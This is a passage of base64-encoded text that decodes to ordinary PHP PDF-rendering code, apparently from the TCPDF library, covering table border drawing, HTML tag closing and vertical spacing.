kJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkJCQkJCQkJJGRlbHRhY29sID0gJHRoaXMtPnggKyAkdGhpcy0+ck1hcmdpbiAtICR0aGlzLT53OwoJCQkJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkJCQkkZGVsdGFjb2wgPSAkdGhpcy0+eCAtICR0aGlzLT5sTWFyZ2luOwoJCQkJCQkJCQkJfQoJCQkJCQkJCQl9IGVsc2VpZiAoJGNvbHVtbiA9PSAkZW5kY29sdW1uKSB7IC8vIGVuZCBjb2x1bW4KCQkJCQkJCQkJCSRjYm9yZGVyID0gJGJvcmRlcl9lbmQ7CgkJCQkJCQkJCQlpZiAoaXNzZXQoJHRoaXMtPmNvbHVtbnNbJGNvbHVtbl1bJ3RoJ11bJ1wnJy4kcGFnZS4nXCcnXSkpIHsKCQkJCQkJCQkJCQkkdGhpcy0+eSA9ICR0aGlzLT5jb2x1bW5zWyRjb2x1bW5dWyd0aCddWydcJycuJHBhZ2UuJ1wnJ107CgkJCQkJCQkJCQl9CgkJCQkJCQkJCQkkdGhpcy0+eCArPSAkZGVsdGFjb2w7CgkJCQkJCQkJCQkkaCA9ICRlbmR5IC0gJHRoaXMtPnk7CgkJCQkJCQkJCX0gZWxzZSB7IC8vIG1pZGRsZSBjb2x1bW4KCQkJCQkJCQkJCSRjYm9yZGVyID0gJGJvcmRlcl9taWRkbGU7CgkJCQkJCQkJCQlpZiAoaXNzZXQoJHRoaXMtPmNvbHVtbnNbJGNvbHVtbl1bJ3RoJ11bJ1wnJy4kcGFnZS4nXCcnXSkpIHsKCQkJCQkJCQkJCQkkdGhpcy0+eSA9ICR0aGlzLT5jb2x1bW5zWyRjb2x1bW5dWyd0aCddWydcJycuJHBhZ2UuJ1wnJ107CgkJCQkJCQkJCQl9CgkJCQkJCQkJCQkkdGhpcy0+eCArPSAkZGVsdGFjb2w7CgkJCQkJCQkJCQkkaCA9ICR0aGlzLT5oIC0gJHRoaXMtPnkgLSAkdGhpcy0+Yk1hcmdpbjsKCQkJCQkJCQkJfQoJCQkJCQkJCQkkY2NvZGUgLj0gJHRoaXMtPmdldENlbGxDb2RlKCR3LCAkaCwgJycsICRjYm9yZGVyLCAxLCAnJywgJGZpbGwsICcnLCAwLCB0cnVlKS4iXG4iOwoJCQkJCQkJCX0gLy8gZW5kIGZvciBlYWNoIGNvbHVtbgoJCQkJCQkJfSBlbHNlaWYgKCRwYWdlID09ICRzdGFydHBhZ2UpIHsgLy8gZmlyc3QgcGFnZQoJCQkJCQkJCSRkZWx0YWNvbCA9IDA7CgkJCQkJCQkJJGRlbHRhdGggPSAwOwoJCQkJCQkJCWZvciAoJGNvbHVtbiA9ICRzdGFydGNvbHVtbjsgJGNvbHVtbiA8ICR0aGlzLT5udW1fY29sdW1uczsgKyskY29sdW1uKSB7IC8vIGZvciBlYWNoIGNvbHVtbgoJCQkJCQkJCQkkdGhpcy0+c2VsZWN0Q29sdW1uKCRjb2x1bW4pOwoJCQkJCQkJCQlpZiAoJGNvbHVtbiA9PSAkc3RhcnRjb2x1bW4pIHsgLy8gZmlyc3QgY29sdW1uCgkJCQkJCQkJCQkkY2JvcmRlciA9ICRib3JkZXJfc3RhcnQ7CgkJCQkJCQkJCQkkdGhpcy0+eSA9ICRzdGFydHk7CgkJCQkJCQkJCQkkdGhpcy0+eCA9ICR4OwoJCQkJCQkJCQkJJGggPSAkdGhpcy0+aCAtICR0aGlzLT55IC0gJHRoaXMtPmJNYXJnaW47CgkJCQkJCQkJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJCQkJCQkJCSRkZWx0YWNvbCA9ICR0aGlzLT54ICsgJHRoaXMtPnJNYXJnaW4gLSAkdGhpcy0+dzsKCQkJCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJCQkJJGRlbHRhY29sID0gJHRoaXMtPnggLSAkdGhpcy0+bE1hcmdpbjsKCQkJCQkJCQkJCX0KCQkJCQkJCQkJfSBlbHNlIHsgLy8gbWlkZGxlIGNvbHVtbgoJCQkJCQkJCQkJJGNib3JkZXIgPSAkYm9yZGVyX21pZGRsZTsKCQkJCQkJCQkJCWlmIChpc3NldCgkdGhpcy0+Y29sdW1uc1skY29sdW1uXVsndGgnXVsnXCcnLiRwYWdlLidcJyddKSkgewoJCQkJCQkJCQkJCSR0aGlzLT55ID0gJHRoaXMtPmNvbHVtbnNbJGNvbHVtbl1bJ3RoJ11bJ1wnJy4kcGFnZS4nXCcnXTsKCQkJCQkJCQkJCX0KCQkJCQkJCQkJCSR0aGlzLT54ICs9ICRkZWx0YWNvbDsKCQkJCQkJCQkJCSRoID0gJHRoaXMtPmggLSAkdGhpcy0+eSAtICR0aGlzLT5iTWFyZ2luOwoJCQkJCQkJCQl9CgkJCQkJCQkJCSRjY29kZSAuPSAkdGhpcy0+Z2V0Q2VsbENvZGUoJHcsICRoLCAnJywgJGNib3JkZXIsIDEsICcnLCAkZmlsbCwgJycsIDAsIHRydWUpLiJcbiI7CgkJCQkJCQkJfSAvLyBlbmQgZm9yIGVhY2ggY29sdW1uCgkJCQkJCQl9IGVsc2VpZiAoJHBhZ2UgPT0gJGVuZHBhZ2UpIHsgLy8gbGFzdCBwYWdlCgkJCQkJCQkJJGRlbHRhY29sID0gMDsKCQkJCQkJCQkkZGVsdGF0aCA9IDA7CgkJCQkJCQkJZm9yICgkY29sdW1uID0gMDsgJGNvbHVtbiA8PSAkZW5kY29sdW1uOyArKyRjb2x1bW4pIHsgLy8gZm9yIGVhY2ggY29sdW1uCgkJCQkJCQkJCSR0aGlzLT5zZWxlY3RDb2x1bW4oJGNvbHVtbik7CgkJCQkJCQkJCWlmICgkY29sdW1uID09ICRlbmRjb2x1bW4pIHsgLy8gZW5kIGNvbHVtbgoJCQkJCQkJCQkJJGNib3JkZXIgPSAkYm9yZGVyX2VuZDsKCQkJCQkJCQkJCWlmIChpc3NldCgkdGhpcy0+Y29sdW1uc1skY29sdW1uXVsndGgnXVsnXCcnLiRwYWdlLidcJyddKSkgewoJCQkJCQkJCQkJCSR0aGlzLT55ID0gJHRoaXMtPmNvbHVtbnNbJGNvbHVtbl1bJ3RoJ11bJ1wnJy4kcGFnZS4nXCcnXTsKCQkJCQkJCQkJCX0KCQkJCQkJCQkJCSR0aGlzLT54ICs9ICRkZWx0YWNvbDsKCQkJCQkJCQkJCSRoID0gJGVuZHkgLSAkdGhpcy0+eTsKCQkJCQkJCQkJfSBlbHNlIHsgLy8gbWlkZGxlIGNvbHVtbgoJCQkJCQkJCQkJJGNib3JkZXIgPSAkYm9yZGVyX21pZGRsZTsKCQkJCQkJCQkJCWlmIChpc3NldCgkdGhpcy0+Y29sdW1uc1skY29sdW1uXVsndGgnXVsnXCcnLiRwYWdlLidcJyddKSkgewoJCQkJCQkJCQkJCSR0aGlzLT55ID0gJHRoaXMtPmNvbHVtbnNbJGNvbHVtbl1bJ3RoJ11bJ1wnJy4kcGFnZS4nXCcnXTsKCQkJCQkJCQkJCX0KCQkJCQkJCQkJCSR0aGlzLT54ICs9ICRkZWx0YWNvbDsKCQkJCQkJCQkJCSRoID0gJHRoaXMtPmggLSAkdGhpcy0+eSAtICR0aGlzLT5iTWFyZ2luOwoJCQkJCQkJCQl9CgkJCQkJCQkJCSRjY29kZSAuPSAkdGhpcy0+Z2V0Q2VsbENvZGUoJHcsICRoLCAnJywgJGNib3JkZXIsIDEsICcnLCAkZmlsbCwgJycsIDAsIHRydWUpLiJcbiI7CgkJCQkJCQkJfSAvLyBlbmQgZm9yIGVhY2ggY29sdW1uCgkJCQkJCQl9IGVsc2UgeyAvLyBtaWRkbGUgcGFnZQoJCQkJCQkJCSRkZWx0YWNvbCA9IDA7CgkJCQkJCQkJJGRlbHRhdGggPSAwOwoJCQkJCQkJCWZvciAoJGNvbHVtbiA9IDA7ICRjb2x1bW4gPCAkdGhpcy0+bnVtX2NvbHVtbnM7ICsrJGNvbHVtbikgeyAvLyBmb3IgZWFjaCBjb2x1bW4KCQkJCQkJCQkJJHRoaXMtPnNlbGVjdENvbHVtbigkY29sdW1uKTsKCQkJCQkJCQkJJGNib3JkZXIgPSAkYm9yZGVyX21pZGRsZTsKCQkJCQkJCQkJaWYgKGlzc2V0KCR0aGlzLT5jb2x1bW5zWyRjb2x1bW5dWyd0aCddWydcJycuJHBhZ2UuJ1wnJ10pKSB7CgkJCQkJCQkJCQkkdGhpcy0+eSA9ICR0aGlzLT5jb2x1bW5zWyRjb2x1bW5dWyd0aCddWydcJycuJHBhZ2UuJ1wnJ107CgkJCQkJCQkJCX0KCQkJCQkJCQkJJHRoaXMtPnggKz0gJGRlbHRhY29sOwoJCQkJCQkJCQkkaCA9ICR0aGlzLT5oIC0gJHRoaXMtPnkgLSAkdGhpcy0+Yk1hcmdpbjsKCQkJCQkJCQkJJGNjb2RlIC49ICR0aGlzLT5nZXRDZWxsQ29kZSgkdywgJGgsICcnLCAkY2JvcmRlciwgMSwgJycsICRmaWxsLCAnJywgMCwgdHJ1ZSkuIlxuIjsKCQkJCQkJCQl9IC8vIGVuZCBmb3IgZWFjaCBjb2x1bW4KCQkJCQkJCX0KCQkJCQkJCWlmICghZW1wdHkoJGNib3JkZXIpIE9SICFlbXB0eSgkZmlsbCkpIHsKCQkJCQkJCQkkb2Zmc2V0bGVuID0gc3RybGVuKCRjY29kZSk7CgkJCQkJCQkJLy8gZHJhdyBib3JkZXIgYW5kIGZpbGwKCQkJCQkJCQlpZiAoJHRoaXMtPmlueG9iaikgewoJCQkJCQkJCQkvLyB3ZSBhcmUgaW5zaWRlIGFuIFhPYmplY3QgdGVtcGxhdGUKCQkJCQkJCQkJaWYgKGVuZCgkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ3RyYW5zZm1yayddKSAhPT0gZmFsc2UpIHsKCQkJCQkJCQkJCSRwYWdlbWFya2tleSA9IGtleSgkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ3RyYW5zZm1yayddKTsKCQkJCQkJCQkJCSRwYWdlbWFyayA9ICR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsndHJhbnNmbXJrJ11bJHBhZ2VtYXJra2V5XTsKCQkJCQkJCQkJCSR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsndHJhbnNmbXJrJ11bJHBhZ2VtYXJra2V5XSArPSAkb2Zmc2V0bGVuOwoJCQkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCQkJJHBhZ2VtYXJrID0gJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydpbnRtcmsnXTsKCQkJCQkJCQkJCSR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsnaW50bXJrJ10gKz0gJG9mZnNldGxlbjsKCQkJCQkJCQkJfQoJCQkJCQkJCQkkcGFnZWJ1ZmYgPSAkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ291dGRhdGEnXTsKCQkJCQkJCQkJJHBzdGFydCA9IHN1YnN0cigkcGFnZWJ1ZmYsIDAsICRwYWdlbWFyayk7CgkJCQkJCQkJCSRwZW5kID0gc3Vic3RyKCRwYWdlYnVmZiwgJHBhZ2VtYXJrKTsKCQkJCQkJCQkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydvdXRkYXRhJ10gPSAkcHN0YXJ0LiRjY29kZS4kcGVuZDsKCQkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCQkvLyBkcmF3IGJvcmRlciBhbmQgZmlsbAoJCQkJCQkJCQlpZiAoZW5kKCR0aGlzLT50cmFuc2ZtcmtbJHRoaXMtPnBhZ2VdKSAhPT0gZmFsc2UpIHsKCQkJCQkJCQkJCSRwYWdlbWFya2tleSA9IGtleSgkdGhpcy0+dHJhbnNmbXJrWyR0aGlzLT5wYWdlXSk7CgkJCQkJCQkJCQkkcGFnZW1hcmsgPSAkdGhpcy0+dHJhbnNmbXJrWyR0aGlzLT5wYWdlXVskcGFnZW1hcmtrZXldOwoJCQkJCQkJCQl9IGVsc2VpZiAoJHRoaXMtPkluRm9vdGVyKSB7CgkJCQkJCQkJCQkkcGFnZW1hcmsgPSAkdGhpcy0+Zm9vdGVycG9zWyR0aGlzLT5wYWdlXTsKCQkJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkJCSRwYWdlbWFyayA9ICR0aGlzLT5pbnRtcmtbJHRoaXMtPnBhZ2VdOwoJCQkJCQkJCQl9CgkJCQkJCQkJCSRwYWdlYnVmZiA9ICR0aGlzLT5nZXRQYWdlQnVmZmVyKCR0aGlzLT5wYWdlKTsKCQkJCQkJCQkJJHBzdGFydCA9IHN1YnN0cigkcGFnZWJ1ZmYsIDAsICRwYWdlbWFyayk7CgkJCQkJCQkJCSRwZW5kID0gc3Vic3RyKCRwYWdlYnVmZiwgJHBhZ2VtYXJrKTsKCQkJCQkJCQkJJHRoaXMtPnNldFBhZ2VCdWZmZXIoJHRoaXMtPnBhZ2UsICRwc3RhcnQuJGNjb2RlLiRwZW5kKTsKCQkJCQkJCQl9CgkJCQkJCQl9CgkJCQkJCX0gLy8gZW5kIGZvciBlYWNoIHBhZ2UKCQkJCQkJLy8gcmVzdG9yZSBkZWZhdWx0IGJvcmRlcgoJCQkJCQkkYm9yZGVyID0gJGRlZmF1bHRfYm9yZGVyOwoJCQkJCX0gLy8gZW5kIGZvciBlYWNoIGNlbGwgb24gdGhlIHJvdwoJCQkJCWlmIChpc3NldCgkdGFibGVfZWxbJ2F0dHJpYnV0ZSddWydjZWxsc3BhY2luZyddKSkgewoJCQkJCQkkdGhpcy0+eSArPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCR0YWJsZV9lbFsnYXR0cmlidXRlJ11bJ2NlbGxzcGFjaW5nJ10sIDEsICdweCcpOwoJCQkJCX0gZWxzZWlmIChpc3NldCgkdGFibGVfZWxbJ2JvcmRlci1zcGFjaW5nJ10pKSB7CgkJCQkJCSR0aGlzLT55ICs9ICR0YWJsZV9lbFsnYm9yZGVyLXNwYWNpbmcnXVsnViddOwoJCQkJCX0KCQkJCQkkdGhpcy0+TG4oMCwgJGNlbGwpOwoJCQkJCSR0aGlzLT54ID0gJHBhcmVudFsnc3RhcnR4J107CgkJCQkJaWYgKCRlbmRwYWdlID4gJHN0YXJ0cGFnZSkgewoJCQkJCQlpZiAoKCR0aGlzLT5ydGwpIEFORCAoJHRoaXMtPnBhZ2VkaW1bJGVuZHBhZ2VdWydvcm0nXSAhPSAkdGhpcy0+cGFnZWRpbVskc3RhcnRwYWdlXVsnb3JtJ10pKSB7CgkJCQkJCQkkdGhpcy0+eCArPSAoJHRoaXMtPnBhZ2VkaW1bJGVuZHBhZ2VdWydvcm0nXSAtICR0aGlzLT5wYWdlZGltWyRzdGFydHBhZ2VdWydvcm0nXSk7CgkJCQkJCX0gZWxzZWlmICgoISR0aGlzLT5ydGwpIEFORCAoJHRoaXMtPnBhZ2VkaW1bJGVuZHBhZ2VdWydvbG0nXSAhPSAkdGhpcy0+cGFnZWRpbVskc3RhcnRwYWdlXVsnb2xtJ10pKSB7CgkJCQkJCQkkdGhpcy0+eCArPSAoJHRoaXMtPnBhZ2VkaW1bJGVuZHBhZ2VdWydvbG0nXSAtICR0aGlzLT5wYWdlZGltWyRzdGFydHBhZ2VdWydvbG0nXSk7CgkJCQkJCX0KCQkJCQl9CgkJCQl9CgkJCQlpZiAoISRpbl90YWJsZV9oZWFkKSB7IC8vIHdlIGFyZSBub3QgaW5zaWRlIGEgdGhlYWQgc2VjdGlvbgoJCQkJCSR0aGlzLT5jZWxsX3BhZGRpbmcgPSBpc3NldCgkdGFibGVfZWxbJ29sZF9jZWxsX3BhZGRpbmcnXSkgPyAkdGFibGVfZWxbJ29sZF9jZWxsX3BhZGRpbmcnXSA6IG51bGw7CgkJCQkJLy8gcmVzZXQgcm93IGhlaWdodAoJCQkJCSR0aGlzLT5yZXNldExhc3RIKCk7CgkJCQkJaWYgKCgkdGhpcy0+cGFnZSA9PSAoJHRoaXMtPm51bXBhZ2VzIC0gMSkpIEFORCAoJHRoaXMtPnBhZ2VvcGVuWyR0aGlzLT5udW1wYWdlc10pKSB7CgkJCQkJCSRwbGVuZGlmZiA9ICgkdGhpcy0+cGFnZWxlblskdGhpcy0+bnVtcGFnZXNdIC0gJHRoaXMtPmVtcHR5cGFnZW1ya1skdGhpcy0+bnVtcGFnZXNdKTsKCQkJCQkJaWYgKCgkcGxlbmRpZmYgPiAwKSBBTkQgKCRwbGVuZGlmZiA8IDYwKSkgewoJCQkJCQkJJHBhZ2VkaWZmID0gc3Vic3RyKCR0aGlzLT5nZXRQYWdlQnVmZmVyKCR0aGlzLT5udW1wYWdlcyksICR0aGlzLT5lbXB0eXBhZ2VtcmtbJHRoaXMtPm51bXBhZ2VzXSwgJHBsZW5kaWZmKTsKCQkJCQkJCWlmIChzdWJzdHIoJHBhZ2VkaWZmLCAwLCA1KSA9PSAnQlQgL0YnKSB7CgkJCQkJCQkJLy8gdGhlIGRpZmZlcmVuY2UgaXMgb25seSBhIGZvbnQgc2V0dGluZwoJCQkJCQkJCSRwbGVuZGlmZiA9IDA7CgkJCQkJCQl9CgkJCQkJCX0KCQkJCQkJaWYgKCRwbGVuZGlmZiA9PSAwKSB7CgkJCQkJCQkvLyByZW1vdmUgbGFzdCBibGFuayBwYWdlCgkJCQkJCQkkdGhpcy0+ZGVsZXRlUGFnZSgkdGhpcy0+bnVtcGFnZXMpOwoJCQkJCQl9CgkJCQkJfQoJCQkJCWlmIChpc3NldCgkdGhpcy0+dGhlYWRNYXJnaW5zWyd0b3AnXSkpIHsKCQkJCQkJLy8gcmVzdG9yZSB0b3AgbWFyZ2luCgkJCQkJCSR0aGlzLT50TWFyZ2luID0gJHRoaXMtPnRoZWFkTWFyZ2luc1sndG9wJ107CgkJCQkJfQoJCQkJCWlmICghaXNzZXQoJHRhYmxlX2VsWydhdHRyaWJ1dGUnXVsnbmVzdGVkJ10pIE9SICgkdGFibGVfZWxbJ2F0dHJpYnV0ZSddWyduZXN0ZWQnXSAhPSAndHJ1ZScpKSB7CgkJCQkJCS8vIHJlc2V0IG1haW4gdGFibGUgaGVhZGVyCgkJCQkJCSR0aGlzLT50aGVhZCA9ICcnOwoJCQkJCQkkdGhpcy0+dGhlYWRNYXJnaW5zID0gYXJyYXkoKTsKCQkJCQkJJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWyd0bSddID0gJHRoaXMtPnRNYXJnaW47CgkJCQkJfQoJCQkJfQoJCQkJJHBhcmVudCA9ICR0YWJsZV9lbDsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ2EnOiB7CgkJCQkkdGhpcy0+SFJFRiA9IGFycmF5KCk7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdzdXAnOiB7CgkJCQkkdGhpcy0+c2V0WFkoJHRoaXMtPkdldFgoKSwgJHRoaXMtPkdldFkoKSArICgoMC43ICogJHBhcmVudFsnZm9udHNpemUnXSkgLyAkdGhpcy0+aykpOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnc3ViJzogewoJCQkJJHRoaXMtPnNldFhZKCR0aGlzLT5HZXRYKCksICR0aGlzLT5HZXRZKCkgLSAoKDAuMyAqICRwYXJlbnRbJ2ZvbnRzaXplJ10pIC8gJHRoaXMtPmspKTsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ2Rpdic6IHsKCQkJCSR0aGlzLT5hZGRIVE1MVmVydFNwYWNlKCRoYnosICRoYiwgJGNlbGwsIGZhbHNlLCAkbGFzdHRhZyk7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdibG9ja3F1b3RlJzogewoJCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCQkkdGhpcy0+ck1hcmdpbiAtPSAkdGhpcy0+bGlzdGluZGVudDsKCQkJCX0gZWxzZSB7CgkJCQkJJHRoaXMtPmxNYXJnaW4gLT0gJHRoaXMtPmxpc3RpbmRlbnQ7CgkJCQl9CgkJCQktLSR0aGlzLT5saXN0aW5kZW50bGV2ZWw7CgkJCQkkdGhpcy0+YWRkSFRNTFZlcnRTcGFjZSgkaGJ6LCAkaGIsICRjZWxsLCBmYWxzZSwgJGxhc3R0YWcpOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAncCc6IHsKCQkJCSR0aGlzLT5hZGRIVE1MVmVydFNwYWNlKCRoYnosICRoYiwgJGNlbGwsIGZhbHNlLCAkbGFzdHRhZyk7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdwcmUnOiB7CgkJCQkkdGhpcy0+YWRkSFRNTFZlcnRTcGFjZSgkaGJ6LCAkaGIsICRjZWxsLCBmYWxzZSwgJGxhc3R0YWcpOwoJCQkJJHRoaXMtPnByZW1vZGUgPSBmYWxzZTsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ2RsJzogewoJCQkJLS0kdGhpcy0+bGlzdG51bTsKCQkJCWlmICgkdGhpcy0+bGlzdG51bSA8PSAwKSB7CgkJCQkJJHRoaXMtPmxpc3RudW0gPSAwOwoJCQkJCSR0aGlzLT5hZGRIVE1MVmVydFNwYWNlKCRoYnosICRoYiwgJGNlbGwsIGZhbHNlLCAkbGFzdHRhZyk7CgkJCQl9IGVsc2UgewoJCQkJCSR0aGlzLT5hZGRIVE1MVmVydFNwYWNlKDAsIDAsICRjZWxsLCBmYWxzZSwgJGxhc3R0YWcpOwoJCQkJfQoJCQkJJHRoaXMtPnJlc2V0TGFzdEgoKTsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ2R0JzogewoJCQkJJHRoaXMtPmxpc3BhY2VyID0gJyc7CgkJCQkkdGhpcy0+YWRkSFRNTFZlcnRTcGFjZSgwLCAwLCAkY2VsbCwgZmFsc2UsICRsYXN0dGFnKTsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ2RkJzogewoJCQkJJHRoaXMtPmxpc3BhY2VyID0gJyc7CgkJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJCSR0aGlzLT5yTWFyZ2luIC09ICR0aGlzLT5saXN0aW5kZW50OwoJCQkJfSBlbHNlIHsKCQkJCQkkdGhpcy0+bE1hcmdpbiAtPSAkdGhpcy0+bGlzdGluZGVudDsKCQkJCX0KCQkJCS0tJHRoaXMtPmxpc3RpbmRlbnRsZXZlbDsKCQkJCSR0aGlzLT5hZGRIVE1MVmVydFNwYWNlKDAsIDAsICRjZWxsLCBmYWxzZSwgJGxhc3R0YWcpOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAndWwnOgoJCQljYXNlICdvbCc6IHsKCQkJCS0tJHRoaXMtPmxpc3RudW07CgkJCQkkdGhpcy0+bGlzcGFjZXIgPSAnJzsKCQkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkJJHRoaXMtPnJNYXJnaW4gLT0gJHRoaXMtPmxpc3RpbmRlbnQ7CgkJCQl9IGVsc2UgewoJCQkJCSR0aGlzLT5sTWFyZ2luIC09ICR0aGlzLT5saXN0aW5kZW50OwoJCQkJfQoJCQkJLS0kdGhpcy0+bGlzdGluZGVudGxldmVsOwoJCQkJaWYgKCR0aGlzLT5saXN0bnVtIDw9IDApIHsKCQkJCQkkdGhpcy0+bGlzdG51bSA9IDA7CgkJCQkJJHRoaXMtPmFkZEhUTUxWZXJ0U3BhY2UoJGhieiwgJGhiLCAkY2VsbCwgZmFsc2UsICRsYXN0dGFnKTsKCQkJCX0gZWxzZSB7CgkJCQkJJHRoaXMtPmFkZEhUTUxWZXJ0U3BhY2UoMCwgMCwgJGNlbGwsIGZhbHNlLCAkbGFzdHRhZyk7CgkJCQl9CgkJCQkkdGhpcy0+cmVzZXRMYXN0SCgpOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnbGknOiB7CgkJCQkkdGhpcy0+bGlzcGFjZXIgPSAnJzsKCQkJCSR0aGlzLT5hZGRIVE1MVmVydFNwYWNlKDAsIDAsICRjZWxsLCBmYWxzZSwgJGxhc3R0YWcpOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnaDEnOgoJCQljYXNlICdoMic6CgkJCWNhc2UgJ2gzJzoKCQkJY2FzZSAnaDQnOgoJCQljYXNlICdoNSc6CgkJCWNhc2UgJ2g2JzogewoJCQkJJHRoaXMtPmFkZEhUTUxWZXJ0U3BhY2UoJGhieiwgJGhiLCAkY2VsbCwgZmFsc2UsICRsYXN0dGFnKTsKCQkJCWJyZWFrOwoJCQl9CgkJCS8vIEZvcm0gZmllbGRzIChzaW5jZSA0LjguMDAwIC0gMjAwOS0wOS0wNykKCQkJY2FzZSAnZm9ybSc6IHsKCQkJCSR0aGlzLT5mb3JtX2FjdGlvbiA9ICcnOwoJCQkJJHRoaXMtPmZvcm1fZW5jdHlwZSA9ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnOwoJCQkJYnJlYWs7CgkJCX0KCQkJZGVmYXVsdCA6IHsKCQkJCWJyZWFrOwoJCQl9CgkJfQoJCS8vIGRyYXcgYm9yZGVyIGFuZCBiYWNrZ3JvdW5kIChpZiBhbnkpCgkJJHRoaXMtPmRyYXdIVE1MVGFnQm9yZGVyKCRwYXJlbnQsICR4bWF4KTsKCQlpZiAoaXNzZXQoJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsnYXR0cmlidXRlJ11bJ3BhZ2VicmVha2FmdGVyJ10pKSB7CgkJCSRwYmEgPSAkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydhdHRyaWJ1dGUnXVsncGFnZWJyZWFrYWZ0ZXInXTsKCQkJLy8gY2hlY2sgZm9yIHBhZ2VicmVhawoJCQlpZiAoKCRwYmEgPT0gJ3RydWUnKSBPUiAoJHBiYSA9PSAnbGVmdCcpIE9SICgkcGJhID09ICdyaWdodCcpKSB7CgkJCQkvLyBhZGQgYSBwYWdlIChvciB0cmlnIEFjY2VwdFBhZ2VCcmVhaygpIGZvciBtdWx0aWNvbHVtbiBtb2RlKQoJCQkJJHRoaXMtPmNoZWNrUGFnZUJyZWFrKCR0aGlzLT5QYWdlQnJlYWtUcmlnZ2VyICsgMSk7CgkJCX0KCQkJaWYgKCgoJHBiYSA9PSAnbGVmdCcpIEFORCAoKCghJHRoaXMtPnJ0bCkgQU5EICgoJHRoaXMtPnBhZ2UgJSAyKSA9PSAwKSkgT1IgKCgkdGhpcy0+cnRsKSBBTkQgKCgkdGhpcy0+cGFnZSAlIDIpICE9IDApKSkpCgkJCQlPUiAoKCRwYmEgPT0gJ3JpZ2h0JykgQU5EICgoKCEkdGhpcy0+cnRsKSBBTkQgKCgkdGhpcy0+cGFnZSAlIDIpICE9IDApKSBPUiAoKCR0aGlzLT5ydGwpIEFORCAoKCR0aGlzLT5wYWdlICUgMikgPT0gMCkpKSkpIHsKCQkJCS8vIGFkZCBhIHBhZ2UgKG9yIHRyaWcgQWNjZXB0UGFnZUJyZWFrKCkgZm9yIG11bHRpY29sdW1uIG1vZGUpCgkJCQkkdGhpcy0+Y2hlY2tQYWdlQnJlYWsoJHRoaXMtPlBhZ2VCcmVha1RyaWdnZXIgKyAxKTsKCQkJfQoJCX0KCQkkdGhpcy0+dG1wcnRsID0gZmFsc2U7CgkJcmV0dXJuICRkb207Cgl9CgoJLyoqCgkgKiBBZGQgdmVydGljYWwgc3BhY2VzIGlmIG5lZWRlZC4KCSAqIEBwYXJhbSBzdHJpbmcgJGhieiBEaXN0YW5jZSBiZXR3ZWVuIGN1cnJlbnQgeSBhbmQgbGluZSBib3R0b20uCgkgKiBAcGFyYW0gc3RyaW5nICRoYiBUaGUgaGVpZ2h0IG9mIHRoZSBicmVhay4KCSAqIEBwYXJhbSBib29sZWFuICRjZWxsIGlmIHRydWUgYWRkIHRoZSBkZWZhdWx0IGxlZnQgKG9yIHJpZ2h0IGlmIFJUTCkgcGFkZGluZyB0byBlYWNoIG5ldyBsaW5lIChkZWZhdWx0IGZhbHNlKS4KCSAqIEBwYXJhbSBib29sZWFuICRmaXJzdHRhZyBzZXQgdG8gdHJ1ZSB3aGVuIHRoZSB0YWcgaXMgdGhlIGZpcnN0LgoJICogQHBhcmFtIGJvb2xlYW4gJGxhc3R0YWcgc2V0IHRvIHRydWUgd2hlbiB0aGUgdGFnIGlzIHRoZSBsYXN0LgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gYWRkSFRNTFZlcnRTcGFjZSgkaGJ6PTAsICRoYj0wLCAkY2VsbD1mYWxzZSwgJGZpcnN0dGFnPWZhbHNlLCAkbGFzdHRhZz1mYWxzZSkgewoJCWlmICgkZmlyc3R0YWcpIHsKCQkJJHRoaXMtPkxuKDAsICRjZWxsKTsKCQkJJHRoaXMtPmh0bWx2c3BhY2UgPSAwOwoJCQlyZXR1cm47CgkJfQoJCWlmICgkbGFzdHRhZykgewoJCQkkdGhpcy0+TG4oJGhieiwgJGNlbGwpOwoJCQkkdGhpcy0+aHRtbHZzcGFjZSA9IDA7CgkJCXJldHVybjsKCQl9CgkJaWYgKCRoYiA8ICR0aGlzLT5odG1sdnNwYWNlKSB7CgkJCSRoZCA9IDA7CgkJfSBlbHNlIHsKCQkJJGhkID0gJGhiIC0gJHRoaXMtPmh0bWx2c3BhY2U7CgkJCSR0aGlzLT5odG1sdnNwYWNlID0gJGhiOwoJCX0KCQkkdGhpcy0+TG4oKCRoYnogKyAkaGQpLCAkY2VsbCk7Cgl9CgoJLyoqCgkgKiBSZXR1cm4gdGhlIHN0YXJ0aW5nIGNvb3J